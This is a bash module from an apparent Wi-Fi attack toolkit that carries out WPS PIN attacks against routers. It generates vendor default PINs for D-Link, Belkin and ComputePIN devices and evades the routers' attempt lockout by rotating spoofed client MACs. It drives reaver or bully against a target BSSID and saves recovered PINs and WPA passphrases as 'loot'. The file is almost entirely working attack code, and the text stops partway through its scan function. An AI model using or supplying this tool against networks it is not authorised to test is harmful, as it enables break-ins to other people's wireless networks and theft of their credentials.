#!/usr/bin/env bash
# 17_wps_attack.sh — WPS PIN attacks: pixie dust, PIN bruteforce,
# vendor-default PIN algorithms, bully backend, offline pixiewps.
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$LOGS_DIR" "$CAPTURES_DIR" 2>/dev/null

WPS_DIR="$TMP_DIR/wps"
WPS_LOOT="$LOOT_DIR/wps"
WPS_RESULTS="$WPS_LOOT/results.tsv"
WPS_CURRENT_PID="$WPS_DIR/current.pid"
WPS_CURRENT_LOG="$WPS_DIR/current.log"
WPS_CURRENT_TARGET="$WPS_DIR/current_target.txt"
WPS_PIXIE_OUT="$WPS_DIR/pixie_dust.txt"

mkdir -p "$WPS_DIR" "$WPS_LOOT"
# NOTE: do NOT `touch` an existing results file. This runs at module load, and
# loot/wps/results.tsv is durable user data — bumping its mtime just because
# the script was invoked mutates loot without producing anything. Create it
# only when it is genuinely absent; wps_cli_harvest appends with >> anyway.
[[ -e "$WPS_RESULTS" ]] || touch "$WPS_RESULTS" 2>/dev/null

wps_get_iface() {
    if [[ -f "$TMP_DIR/mon_iface" ]]; then
        cat "$TMP_DIR/mon_iface"
        return 0
    fi
    iw dev 2>/dev/null | awk '
        /Interface/ { iface=$2 }
        /type monitor/ { print iface; exit }
    '
}

# ═══════════════════════════════════════════════════════════════════
#  WPS PIN algorithms
# ═══════════════════════════════════════════════════════════════════

# Standard WPS PIN checksum (used by reaver/wash).
wps_pin_checksum() {
    # pin_str must be exactly 7 digits, no leading +, no leading zeros treated as octal
    local pin_str="$1"
    local accum=0
    local i c

    # Ensure 7 chars by left-padding with 0
    while (( ${#pin_str} < 7 )); do pin_str="0$pin_str"; done
    pin_str="${pin_str:0:7}"

    for ((i = 0; i < 7; i++)); do
        c="${pin_str:$i:1}"
        c=$((10#$c))
        if (( i % 2 == 0 )); then
            accum=$(( accum + 3 * c ))
        else
            accum=$(( accum + c ))
        fi
    done
    echo $(( (10 - accum % 10) % 10 ))
}

# ComputePIN — the widely-cited default that several vendors ship.
# Reference: Stefan Viehböck, 2011. Works against many TRENDnet,
# D-Link, and Belkin devices that use the same embedded WPS stack.
wps_pin_computepin() {
    local mac="$1"
    local m="${mac//:/}"
    m="${m//-/}"
    m=$(printf '%s' "$m" | tr 'a-f' 'A-F')

    local c1 c2 c3
    c1=$(( 16#${m:0:4} ))
    c2=$(( 16#${m:4:4} ))
    c3=$(( 16#${m:8:4} ))

    local xored=$(( c1 ^ c2 ^ c3 ))
    local base=$(( xored % 10000000 ))   # 7 digits

    # Pad to 7 chars without printf %d (avoids octal trap)
    local base_str
    base_str=$(printf '%d' "$base")
    while (( ${#base_str} < 7 )); do base_str="0$base_str"; done
    base_str="${base_str:0:7}"

    local chk
    chk=$(wps_pin_checksum "$base_str")
    printf '%s%s\n' "$base_str" "$chk"
}

# ── D-Link default PIN ───────────────────────────────────────────────
# Documented algorithm: Craig Heffner / Tactical Network Solutions,
# devttys0/wps pingens/dlink/pingen.py ("Calculates the default WPS pin from
# the BSSID/MAC of many D-Link routers/APs"). The 3WiFi generator ships the
# same scheme as algodlink; the two agree bit-for-bit on every vector checked.
# It is MAC-only and always yields 7 digits + a valid WPS check digit.
#
#   nic  = (MAC & 0xFFFFFF) ^ 0x55AA55
#   nic ^= (nic & 0xF) spread over bits 4,8,12,16,20
#   pin  = nic % 10^7 ; if pin < 10^6: pin += (pin % 9)*10^6 + 10^6
#   PIN  = 7-digit pin + wps_pin_checksum(pin)
wps_pin_dlink() {
    local mac="${1:-}"
    [[ -z "$mac" ]] && { printf 'ERROR\tno mac\n' >&2; return 2; }
    local m="${mac//:/}"
    m="${m//-/}"; m="${m//./}"
    m=$(printf '%s' "$m" | tr 'a-f' 'A-F')
    (( ${#m} == 12 )) || { printf 'ERROR\tbad mac: %s\n' "$mac" >&2; return 2; }

    local pin=$(( (16#$m) & 0xFFFFFF ))
    pin=$(( pin ^ 0x55AA55 ))
    local lo=$(( pin & 0xF ))
    pin=$(( pin ^ ( (lo << 4) | (lo << 8) | (lo << 12) | (lo << 16) | (lo << 20) ) ))
    pin=$(( pin % 10000000 ))
    # Guarantees a full 7 digits (and a non-zero leading digit).
    (( pin < 1000000 )) && pin=$(( pin + (pin % 9) * 1000000 + 1000000 ))

    local chk
    chk=$(wps_pin_checksum "$(printf '%07d' "$pin")")
    printf '%07d%s\n' "$pin" "$chk"
}

# ── Belkin default PIN ───────────────────────────────────────────────
# The documented Belkin scheme derives the PIN from the BSSID **and the last
# four characters of the router serial number** — the serial is precisely what
# makes it unpredictable. Craig Heffner / TNS reversed it from firmware
# (devttys0/wps pingens/belkin/pingen.c, "Reversing Belkin's WPS pin
# algorithm"); 3WiFi ships the identical scheme as pinBelkin (Stas'M's
# universal DSL generator with bx = 66,129,209,10,24,3,39), and the two agree
# on every vector checked.
#
# There is NO documented Belkin-specific MAC-only PIN, so a missing serial is
# refused instead of guessed: the old nic ^ 0x4D2E seed was invented and
# appeared in no algorithm, generator or write-up.
wps_pin_belkin() {
    local mac="${1:-}" sn="${2:-}"
    [[ -z "$mac" ]] && { printf 'ERROR\tno mac\n' >&2; return 2; }
    [[ -z "$sn" ]] && {
        printf 'ERROR\tBelkin needs the serial (last 4 chars) as arg 2; it is not derivable from the BSSID alone\n' >&2
        return 2
    }
    local m="${mac//:/}"
    m="${m//-/}"; m="${m//./}"
    m=$(printf '%s' "$m" | tr 'a-f' 'A-F')
    (( ${#m} == 12 )) || { printf 'ERROR\tbad mac: %s\n' "$mac" >&2; return 2; }

    # S/N: truncate to the last 4 chars, left-pad, parse each as a HEX digit
    # (both reference implementations use base 16 and map non-hex to 0).
    local s="$sn"
    (( ${#s} > 4 )) && s="${s: -4}"
    while (( ${#s} < 4 )); do s="0$s"; done

    local mac_int=$(( 16#$m ))
    local -a nic=(
        $(( (mac_int & 0xFFFF) >> 12 ))
        $(( (mac_int & 0xFFF)  >>  8 ))
        $(( (mac_int & 0xFF)   >>  4 ))
        $((  mac_int           & 0xF  ))
    )
    local -a snn=()
    local i c
    for (( i = 0; i < 4; i++ )); do
        c="${s:$i:1}"
        if [[ "$c" =~ ^[0-9a-fA-F]$ ]]; then snn+=( "$(( 16#$c ))" ); else snn+=( 0 ); fi
    done

    # k1 from bk1 = 60 (bits 2,3,4,5), k2 from bk2 = 195 (bits 0,1,6,7)
    local k1=$(( (nic[2] + nic[3] + snn[0] + snn[1]) & 0xF ))
    local k2=$(( (nic[0] + nic[1] + snn[2] + snn[3]) & 0xF ))

    local -a bx=(66 129 209 10 24 3 39)
    local pin=0 x v bx_copy
    for v in "${bx[@]}"; do
        x=0; i=0; bx_copy=$v
        while (( bx_copy > 0 )); do
            if (( bx_copy & 1 )); then
                if   (( i > 4 )); then x=$(( x ^ snn[i-4] ))
                elif (( i > 1 )); then x=$(( x ^ nic[i-1] ))
                elif (( i > 0 )); then x=$(( x ^ k2 ))
                else                   x=$(( x ^ k1 ))
                fi
            fi
            bx_copy=$(( bx_copy >> 1 ))
            i=$(( i + 1 ))
        done
        pin=$(( (pin << 4) | x ))
    done
    pin=$(( pin % 10000000 ))

    local chk
    chk=$(wps_pin_checksum "$(printf '%07d' "$pin")")
    printf '%07d%s\n' "$pin" "$chk"
}

# Emit a candidate wordlist from all known algorithms + common defaults.
# The Belkin entry is only emitted when a serial is supplied, because the
# documented Belkin scheme cannot be evaluated without one.
wps_pin_candidates() {
    local mac="$1"
    local out="$2"
    local sn="${3:-}"

    {
        # Common factory defaults
        printf '%s\n' \
            12345670 00000000 11111111 22222222 33333333 44444444 \
            55555555 66666666 77777777 88888888 99999999 \
            01234565 12345678 87654321 88888888 \
            12345065 22222220 00000000

        # Vendor algorithms (only if we have a MAC)
        if [[ -n "$mac" ]]; then
            wps_pin_computepin "$mac"
            wps_pin_dlink "$mac"
            [[ -n "$sn" ]] && wps_pin_belkin "$mac" "$sn"
        fi
    } | awk '!seen[$0]++' > "$out"
}

# ═══════════════════════════════════════════════════════════════════
#  lockout detection
# ═══════════════════════════════════════════════════════════════════

wps_is_locked_out() {
    local log="$1"
    [[ ! -f "$log" ]] && return 1
    tail -20 "$log" 2>/dev/null | grep -qiE 'WPS.*locked|AP locked|WPS.*lock|tx limit'
}

wps_wait_unlock() {
    local log="$1"
    local wait_s="${2:-60}"
    if wps_is_locked_out "$log"; then
        warn "AP reports WPS lockout — waiting ${wait_s}s before retrying"
        sleep "$wait_s"
        return 0
    fi
    return 1
}

# ═══════════════════════════════════════════════════════════════════
#  lockout bypass — MAC rotation + rate limiting + pause-on-lockout
# ═══════════════════════════════════════════════════════════════════
# APs implement WPS lockout per *client MAC* (the registrar's source MAC),
# so the primary evasion is to present a different client MAC for each
# attempt window. Rate limiting keeps the attempt count per window under the
# AP's lockout threshold, and a detected lockout is waited out rather than
# hammered through. Everything the runner needs is computed here so the plan
# can be emitted (and tested) with no radio present.

WPS_BYPASS_PLAN="$WPS_DIR/lockout_bypass.plan"
WPS_BYPASS_LOG="$WPS_DIR/lockout_bypass.log"
WPS_BYPASS_REPORT="$WPS_DIR/lockout_bypass.report.tsv"

# Tunables. Deliberately data, not magic numbers buried in the loop, so the
# emitted PLAN and the selftest assertions cannot drift apart.
: "${WPS_BYPASS_ATTEMPTS_PER_MAC:=5}"
: "${WPS_BYPASS_DELAY:=1}"
: "${WPS_BYPASS_LOCK_DELAY:=60}"
: "${WPS_BYPASS_CHUNK:=60}"
: "${WPS_BYPASS_UNLOCK_WAIT:=60}"
: "${WPS_BYPASS_MAX_WINDOWS:=10}"

# A locally-administered, unicast MAC. Bit 0 of the first octet must be 0
# (unicast) and bit 1 must be 1 (locally administered), otherwise the
# adapter may refuse the address or the AP may treat it as a group address.

# ── restore the hardware MAC ────────────────────────────────────────────
# This module rotates the client MAC for the lockout bypass and, until now,
# had no way back. That matters more than it looks: udev derives the wlx*
# interface name FROM the MAC, so a MAC left spoofed renames the adapter,
# every recorded interface name goes stale, and later runs fail with
# "no monitor interface" or "device is not up" far from the real cause.
#
# macchanger reports the burned-in address even while spoofed, so the
# permanent value can always be recovered.
wps_restore_mac() {
    local iface="${1:-}"
    [[ -n "$iface" ]] || iface=$(wps_get_iface)
    [[ -n "$iface" ]] || { printf 'ERROR\tno interface given and none selected\n' >&2; return 2; }
    [[ -d "/sys/class/net/$iface" ]] || {
        printf 'ERROR\tno such interface: %s\n' "$iface" >&2; return 1; }

    local cur perm
    cur=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
    if command -v macchanger >/dev/null 2>&1; then
        perm=$(macchanger -s "$iface" 2>/dev/null \
               | awk -F'Permanent MAC: ' '/Permanent MAC:/{print $2}' | awk '{print $1}')
    fi
    [[ -n "$perm" ]] || {
        printf 'ERROR\tcannot determine the permanent MAC for %s - macchanger needed\n' "$iface" >&2
        return 1; }

    printf 'CURRENT\t%s\t%s\n' "$iface" "$cur"
    printf 'PERMANENT\t%s\t%s\n' "$iface" "$perm"

    if [[ "${cur,,}" == "${perm,,}" ]]; then
        printf 'OK\t%s already has its hardware MAC\n' "$iface"
        return 0
    fi

    if command -v macchanger >/dev/null 2>&1; then
        ip link set dev "$iface" down 2>/dev/null
        macchanger -p "$iface" >/dev/null 2>&1
        ip link set dev "$iface" up 2>/dev/null
    else
        ip link set dev "$iface" down 2>/dev/null
        ip link set dev "$iface" address "$perm" 2>/dev/null
        ip link set dev "$iface" up 2>/dev/null
    fi

    # Verify rather than assume - this needs root, and a silent failure here
    # leaves the adapter spoofed and the interface name wrong.
    local now; now=$(cat "/sys/class/net/$iface/address" 2>/dev/null)
    if [[ "${now,,}" == "${perm,,}" ]]; then
        printf 'RESTORED\t%s\t%s\n' "$iface" "$now"
        printf 'NOTE\tudev may rename the interface now that the MAC changed - replug or run udevadm trigger, then re-enable monitor mode\n'
        return 0
    fi
    printf 'ERROR\tstill %s - restoring the MAC needs root (pkexec)\n' "${now:-unknown}" >&2
    return 1
}

wps_random_client_mac() {
    local oui="${1:-}"
    if [[ -n "$oui" ]]; then
        local o1 o2 o3 rest
        o1="${oui%%:*}"; rest="${oui#*:}"
        o2="${rest%%:*}"; o3="${rest##*:}"
        printf '%s:%s:%s:%02x:%02x:%02x\n' "$o1" "$o2" "$o3" \
            $(( RANDOM % 256 )) $(( RANDOM % 256 )) $(( RANDOM % 256 ))
        return 0
    fi
    local b1 b2 b3 b4 b5 b6
    b1=$(printf '%02x' $(( (RANDOM % 256) & 0xFC | 0x02 )))
    b2=$(printf '%02x' $(( RANDOM % 256 )))
    b3=$(printf '%02x' $(( RANDOM % 256 )))
    b4=$(printf '%02x' $(( RANDOM % 256 )))
    b5=$(printf '%02x' $(( RANDOM % 256 )))
    b6=$(printf '%02x' $(( RANDOM % 256 )))
    printf '%s:%s:%s:%s:%s:%s\n' "$b1" "$b2" "$b3" "$b4" "$b5" "$b6"
}

# Rotate within an operator-supplied MAC: keep the OUI, advance the NIC byte.
wps_offset_mac() {
    local mac="$1" n="$2"
    local oui last
    oui="${mac%:*}"; last="${mac##*:}"
    printf '%s:%02x\n' "$oui" $(( (16#$last + n) % 256 ))
}

# The command that applies a MAC to an interface. macchanger is preferred
# because it also handles the down/up dance; the iproute2 form is the
# fallback. Emitted into the PLAN and used by the runner.
wps_mac_rotate_cmd() {
    local iface="$1" mac="$2"
    [[ -z "$iface" || -z "$mac" ]] && return 1
    if command -v macchanger >/dev/null 2>&1; then
        printf 'macchanger --mac=%s %s\n' "$mac" "$iface"
    else
        printf 'ip link set dev %s down; ip link set dev %s address %s; ip link set dev %s up\n' \
            "$iface" "$iface" "$mac" "$iface"
    fi
    return 0
}

wps_rotate_mac() {
    local iface="$1" mac="$2"
    if command -v macchanger >/dev/null 2>&1; then
        macchanger --mac="$mac" "$iface" && return 0
        warn "macchanger failed on $iface — falling back to ip link"
    fi
    ip link set dev "$iface" down 2>/dev/null
    ip link set dev "$iface" address "$mac" 2>/dev/null || return 1
    ip link set dev "$iface" up 2>/dev/null
    return 0
}

# Injection verdict for an iface, from the cache 01_iface.sh maintains.
# Never transmits: `aireplay-ng --test` would put frames on the air, and a
# capability probe must not be an attack. Prints yes|no|unknown|unverified.
wps_injection_state() {
    local iface="$1"
    [[ -z "$iface" ]] && { printf 'missing\n'; return 0; }
    if [[ "${WIFISTING_INJECTION_VERIFIED:-}" == "1" ]]; then
        printf 'yes\n'; return 0
    fi
    local f="$TMP_DIR/iface_caps_cache/$iface.json"
    [[ -f "$f" ]] || { printf 'unverified\n'; return 0; }
    local v
    v=$(grep -o '"injection":"[^"]*"' "$f" 2>/dev/null | head -1 | sed 's/.*://; s/"//g')
    printf '%s\n' "${v:-unverified}"
}

wps_backend_for() {
    if command -v reaver >/dev/null 2>&1; then printf 'reaver\n'; return 0; fi
    if command -v bully  >/dev/null 2>&1; then printf 'bully\n';  return 0; fi
    return 1
}

# Pure decision function: prints the refusal reason, or nothing + rc 1 when
# the bypass may actually run. Kept free of live probes so the selftest can
# assert every branch without a radio.
wps_lockout_bypass_refusal_reason() {
    local iface="$1" backend="$2" injection="$3"
    if [[ -z "$iface" ]]; then
        printf 'no monitor interface — wps_get_iface found none and %s/mon_iface is absent\n' \
            "$TMP_DIR"
        return 0
    fi
    if [[ -z "$backend" ]]; then
        printf 'no WPS backend installed (need reaver or bully)\n'
        return 0
    fi
    if [[ "$injection" != "yes" ]]; then
        printf 'no injection-verified adapter: %s reports injection=%s, and PIN attempts need an adapter that can associate and inject (verify with 01_iface.sh --caps-tsv %s)\n' \
            "$iface" "${injection:-unknown}" "$iface"
        return 0
    fi
    return 1
}

# Attempt/lockout accounting. Both read only, so they work on a synthetic log.
wps_log_attempt_count() {
    local log="$1" n=""
    [[ -f "$log" ]] || { printf '0\n'; return 0; }
    n=$(grep -ciE 'trying pin' "$log" 2>/dev/null || true)
    printf '%s\n' "${n:-0}"
}

wps_log_lockout_count() {
    local log="$1" n=""
    [[ -f "$log" ]] || { printf '0\n'; return 0; }
    n=$(grep -ciE 'WPS.*locked|AP locked|WPS.*lock|tx limit' "$log" 2>/dev/null || true)
    printf '%s\n' "${n:-0}"
}

wps_log_pin() {
    local log="$1"
    [[ -f "$log" ]] || return 0
    grep -oE "WPS PIN: '[^']+'" "$log" 2>/dev/null | head -1 | sed "s/WPS PIN: '//;s/'$//"
}

wps_log_psk() {
    local log="$1"
    [[ -f "$log" ]] || return 0
    grep -oE "WPA PSK: '[^']+'" "$log" 2>/dev/null | head -1 | sed "s/WPA PSK: '//;s/'$//"
}

wps_lockout_observed_state() {
    local log="$1"
    [[ ! -f "$log" ]] && { printf 'NOLOG\n'; return 0; }
    if wps_is_locked_out "$log"; then printf 'LOCKED\n'; else printf 'CLEAR\n'; fi
}

# Backend invocation for the bypass. reaver gets -m (source MAC) and -M
# (its own per-pin last-digit MAC rotation) on top of the rate limits; bully
# uses -s for the source MAC and -l for the lock wait.
wps_backend_cmd() {
    local backend="$1" iface="$2" bssid="$3" chan="$4" mac="$5"
    case "$backend" in
        bully)
            printf 'bully -b %s -c %s -s %s -l %s -S -B %s\n' \
                "$bssid" "${chan:-1}" "$mac" "$WPS_BYPASS_LOCK_DELAY" "$iface"
            ;;
        *)
            printf 'reaver -i %s -b %s -c %s -m %s -M -d %s -l %s -N -q\n' \
                "$iface" "$bssid" "${chan:-1}" "$mac" \
                "$WPS_BYPASS_DELAY" "$WPS_BYPASS_LOCK_DELAY"
            ;;
    esac
}

# ═══════════════════════════════════════════════════════════════════
#  lockout bypass — plan
# ═══════════════════════════════════════════════════════════════════
wps_lockout_bypass_plan() {
    local bssid="$1" mac="$2" iface="${3:-}" backend="${4:-}"
    local chan="${TARGET_CHANNEL:-${5:-1}}"
    local sample_cmac rot_cmd

    if [[ -n "$mac" ]]; then
        sample_cmac=$(wps_offset_mac "$mac" 1)
    else
        sample_cmac=$(wps_random_client_mac)
    fi
    rot_cmd=$(wps_mac_rotate_cmd "${iface:-IFACE}" "$sample_cmac")

    printf 'PLAN\tverb\t--lockout-bypass\n'
    printf 'PLAN\tbssid\t%s\n' "$bssid"
    printf 'PLAN\tchannel\t%s\n' "$chan"
    printf 'PLAN\tiface\t%s\n' "${iface:-<unresolved>}"
    printf 'PLAN\tbackend\t%s\n' "${backend:-<none installed>}"
    printf 'PLAN\tclient_mac\t%s\n' "${mac:-random-per-window}"
    printf 'PLAN\tstrategy\trotate-mac + rate-limit + pause-on-lockout\n'
    printf 'PLAN\tprimary\tMAC rotation — the AP locks out per client MAC, so a fresh MAC resets its counter\n'
    printf 'PLAN\tsample_client_mac\t%s\n' "$sample_cmac"
    printf 'PLAN\tmac_rotation_cmd\t%s\n' "$rot_cmd"
    printf 'PLAN\trate_limit\t%s\n' \
        "backend delay ${WPS_BYPASS_DELAY}s between PIN attempts, ${WPS_BYPASS_CHUNK}s per window"
    printf 'PLAN\tattempt_budget\t%s attempts per window (stay under the AP threshold)\n' \
        "$WPS_BYPASS_ATTEMPTS_PER_MAC"
    printf 'PLAN\tlock_delay\t%s\n' \
        "backend lock-delay ${WPS_BYPASS_LOCK_DELAY}s; bypass pauses ${WPS_BYPASS_UNLOCK_WAIT}s on a detected lockout"
    printf 'PLAN\tmax_windows\t%s\n' "$WPS_BYPASS_MAX_WINDOWS"
    printf 'PLAN\tdetect\tlast 20 log lines matching WPS locked|AP locked|WPS lock|tx limit\n'
    printf 'PLAN\tstep\t1. pick a fresh client MAC (macchanger / ip link set address)\n'
    printf 'PLAN\tstep\t2. run the backend for %ss with a %ss inter-attempt delay\n' \
        "$WPS_BYPASS_CHUNK" "$WPS_BYPASS_DELAY"
    printf 'PLAN\tstep\t3. re-read the log tail; on a lockout pause %ss, then continue\n' \
        "$WPS_BYPASS_UNLOCK_WAIT"
    printf 'PLAN\tstep\t4. stop early on PIN/PSK, otherwise repeat up to %s windows\n' \
        "$WPS_BYPASS_MAX_WINDOWS"
    printf 'PLAN\tevidence\tattempt counts and lockout state are read from the backend log, never assumed\n'
    printf 'PLAN\thonesty\ta lockout observed at the end is reported as failure, not as a successful bypass\n'
}

# ═══════════════════════════════════════════════════════════════════
#  lockout bypass — runner
# ═══════════════════════════════════════════════════════════════════
wps_lockout_bypass_run() {
    local bssid="$1" mac="$2" iface="$3" backend="$4"
    local chan="${TARGET_CHANNEL:-1}"
    local window=0 total=0 locked_windows=0 clean_windows=0
    local state="UNKNOWN" pin="" psk=""

    : > "$WPS_BYPASS_LOG"
    : > "$WPS_BYPASS_REPORT"

    warn "lockout bypass: MAC rotation + rate limiting against $bssid on $iface"

    while (( window < WPS_BYPASS_MAX_WINDOWS )); do
        window=$(( window + 1 ))

        local cmac
        if [[ -n "$mac" ]]; then
            cmac=$(wps_offset_mac "$mac" "$window")
        else
            cmac=$(wps_random_client_mac)
        fi

        local rot_cmd
        rot_cmd=$(wps_mac_rotate_cmd "$iface" "$cmac")
        printf 'WINDOW\t%s\t%s\t%s\n' "$window" "$cmac" "$rot_cmd" >> "$WPS_BYPASS_REPORT"
        printf '\n=== window %s: client MAC %s ===\n' "$window" "$cmac" >> "$WPS_BYPASS_LOG"

        wps_rotate_mac "$iface" "$cmac" >> "$WPS_BYPASS_LOG" 2>&1

        local cmd
        cmd=$(wps_backend_cmd "$backend" "$iface" "$bssid" "$chan" "$cmac")
        local -a argv
        read -r -a argv <<< "$cmd"
        timeout "$WPS_BYPASS_CHUNK" "${argv[@]}" >> "$WPS_BYPASS_LOG" 2>&1

        local before
        before=$total
        total=$(wps_log_attempt_count "$WPS_BYPASS_LOG")
        state=$(wps_lockout_observed_state "$WPS_BYPASS_LOG")

        printf 'ATTEMPTS_AFTER_WINDOW\t%s\t%s\n' "$window" "$total" >> "$WPS_BYPASS_REPORT"
        printf 'LOCKOUT_AFTER_WINDOW\t%s\t%s\n'  "$window" "$state" >> "$WPS_BYPASS_REPORT"

        if [[ "$state" == "LOCKED" ]]; then
            locked_windows=$(( locked_windows + 1 ))
            warn "window $window: lockout reported after $(( total - before )) attempts — pausing ${WPS_BYPASS_UNLOCK_WAIT}s"
            sleep "$WPS_BYPASS_UNLOCK_WAIT"
        else
            clean_windows=$(( clean_windows + 1 ))
        fi

        pin=$(wps_log_pin "$WPS_BYPASS_LOG")
        psk=$(wps_log_psk "$WPS_BYPASS_LOG")
        [[ -n "$pin" || -n "$psk" ]] && break
    done

    state=$(wps_lockout_observed_state "$WPS_BYPASS_LOG")
    printf 'WINDOWS\t%s\n'        "$window"
    printf 'ATTEMPTS\t%s\n'       "$total"
    printf 'LOCKED_WINDOWS\t%s\n' "$locked_windows"
    printf 'CLEAN_WINDOWS\t%s\n'  "$clean_windows"
    printf 'LOCKOUT_STATE\t%s\n'  "$state"
    printf 'REPORT\t%s\n'         "$WPS_BYPASS_REPORT"
    printf 'LOG\t%s\n'            "$WPS_BYPASS_LOG"

    # Never claim the bypass worked on a PIN we do not have. A run that ends
    # with the AP still locking out is reported as exactly that.
    if [[ -n "$pin" || -n "$psk" ]]; then
        printf 'PIN\t%s\n' "$pin"
        printf 'PSK\t%s\n' "$psk"
        printf 'RESULT\tpin-recovered\n'
        return 0
    fi
    if [[ "$state" == "LOCKED" ]]; then
        printf 'REFUSE\tAP still reports a WPS lockout after %s attempts over %s window(s) — MAC rotation did not defeat it\n' \
            "$total" "$window" >&2
        return 1
    fi
    printf 'REFUSE\tno PIN recovered after %s attempts over %s window(s)\n' \
        "$total" "$window" >&2
    return 1
}

wps_cli_lockout_bypass() {
    local bssid="$1" mac="${2:-}"
    [[ -z "$bssid" ]] && {
        printf 'usage: --lockout-bypass BSSID [CLIENT_MAC]\n' >&2
        return 2
    }
    if [[ ! "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        printf 'ERROR\tinvalid BSSID: %s\n' "$bssid" >&2
        return 2
    fi
    if [[ -n "$mac" && ! "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        printf 'ERROR\tinvalid client MAC: %s\n' "$mac" >&2
        return 2
    fi

    local iface backend injection
    iface=$(wps_get_iface)
    backend=$(wps_backend_for)
    injection=$(wps_injection_state "$iface")

    mkdir -p "$WPS_DIR"
    wps_lockout_bypass_plan "$bssid" "$mac" "$iface" "$backend" | tee "$WPS_BYPASS_PLAN"

    local reason
    reason=$(wps_lockout_bypass_refusal_reason "$iface" "$backend" "$injection")
    if [[ -n "$reason" ]]; then
        printf 'REFUSE\tlockout bypass not run: %s\n' "$reason" >&2
        printf 'STATE\trefused\n'
        return 1
    fi

    wps_lockout_bypass_run "$bssid" "$mac" "$iface" "$backend"
}

# ═══════════════════════════════════════════════════════════════════
#  status
# ═══════════════════════════════════════════════════════════════════

wps_cli_status_tsv() {
    local iface
    iface=$(wps_get_iface)
    local reaver bully pixie wash
    reaver=$(command -v reaver   >/dev/null && echo yes || echo no)
    bully=$(command -v bully     >/dev/null && echo yes || echo no)
    pixie=$(command -v pixiewps  >/dev/null && echo yes || echo no)
    wash=$(command -v wash       >/dev/null && echo yes || echo no)

    local running=0 pid=""
    if [[ -f "$WPS_CURRENT_PID" ]]; then
        pid=$(cat "$WPS_CURRENT_PID")
        kill -0 "$pid" 2>/dev/null && running=1
    fi
    # Fallback: match by pattern
    if (( running == 0 )); then
        local p
        p=$(pgrep -f 'reaver -i|bully .*-b' | head -1)
        [[ -n "$p" ]] && { running=1; pid="$p"; }
    fi
    local current=""
    [[ -f "$WPS_CURRENT_TARGET" ]] && current=$(cat "$WPS_CURRENT_TARGET")

    printf 'mon_iface\t%s\n' "$iface"
    printf 'reaver\t%s\n'    "$reaver"
    printf 'bully\t%s\n'     "$bully"
    printf 'pixiewps\t%s\n'  "$pixie"
    printf 'wash\t%s\n'      "$wash"
    printf 'running\t%s\n'   "$running"
    printf 'pid\t%s\n'       "$pid"
    printf 'current\t%s\n'   "$current"
    printf 'loot_dir\t%s\n'  "$WPS_LOOT"
    printf 'results_file\t%s\n' "$WPS_RESULTS"
}

# ═══════════════════════════════════════════════════════════════════
#  scan (wash)
# ═══════════════════════════════════════════════════════════════════


# ── link state ──────────────────────────────────────────────────────────
# Monitor mode is a TYPE; it says nothing about whether the interface is
# administratively up. reaver and wash both fail with
#   pcap_activate status -9 - That device is not up
# when it is down, and that error arrives buried in the tool's own log.
wps_iface_is_up() {
    ip -o link show dev "$1" 2>/dev/null \
        | sed -n 's/.*<\([^>]*\)>.*/\1/p' | tr ',' '\n' | grep -qx UP
}

# Bring it up if needed. Needs root, so a failure is reported with the exact
# command the operator has to run rather than left to surface later as -9.
wps_ensure_iface_up() {
    local iface="$1" flags
    flags=$(ip -o link show dev "$iface" 2>/dev/null \
            | sed -n 's/.*<\([^>]*\)>.*/\1/p')
    # An interface ip cannot see at all is not something to block on: under
    # --selftest the interface is a name with no device behind it, and the
    # real tool will report its own failure. Only a KNOWN, down interface is
    # acted on.
    [[ -z "$flags" ]] && return 0
    case ",$flags," in *,UP,*) return 0 ;; esac

    ip link set dev "$iface" up 2>/dev/null
    flags=$(ip -o link show dev "$iface" 2>/dev/null \
            | sed -n 's/.*<\([^>]*\)>.*/\1/p')
    case ",$flags," in
        *,UP,*) printf 'OK\tbrought %s up\n' "$iface" >&2; return 0 ;;
    esac
    printf 'ERROR\t%s is down and could not be brought up - run: ip link set %s up\n' \
        "$iface" "$iface" >&2
    return 1
}

wps_cli_scan_tsv() {
    local dur="${1:-30}"
    local iface
    iface=$(wps_get_iface)
    [[ -z "$iface" ]] && { printf 'ERROR\tno monitor interface\n' >&2; return 1; }
    command -v wash >/dev/null || { printf 'ERROR\twash not installed\n' >&2; return 1; }

    # wash needs CAP_NET_RAW. Without it pcap_activate fails at once, and the
    # 2>/dev/null that used to be here turned that into a completely silent
    # empty result - the operator could not tell "no WPS APs" from "no
    # permission" from "wrong interface".
    local itype
    itype=$(iw dev "$iface" info 2>/dev/null | awk '/type/ {print $2; exit}')
    if [[ -n "$itype" && "$itype" != "monitor" ]]; then
        printf 'ERROR\t%s is not in monitor mode - enable it in Interface Manager\n' \
            "$iface" >&2
        return 1
    fi

    wps_ensure_iface_up "$iface" || return 1

